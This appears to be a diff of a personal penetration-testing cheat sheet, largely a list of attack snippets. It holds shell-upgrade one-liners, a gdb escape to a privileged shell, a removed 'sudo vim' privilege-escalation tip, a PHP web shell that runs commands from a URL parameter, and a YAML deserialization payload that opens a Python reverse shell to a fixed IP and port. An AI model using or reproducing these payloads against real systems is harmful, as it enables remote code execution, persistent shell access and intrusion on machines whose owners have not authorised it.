@@ -3,9 +3,6 @@
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 python -c 'import pty; pty.spawn("/bin/bash")'
 /bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "bash", "-p")' -ex quit
-#privesc
-sudo vim
-:!sh or :!bash
 ```
 unified - terminal
 ```
@@ -30,7 +27,7 @@ system($_GET['cmd']);
 $resultado = system($_GET['cmd']);
 <h1 class="page-title"><?= $resultado ?></h1>
 ```
-yaml - exploit
+yaml
 ```bash
 - !!python/object/apply:subprocess.Popen
   - ["python3", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.159.218',333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/sh')"]
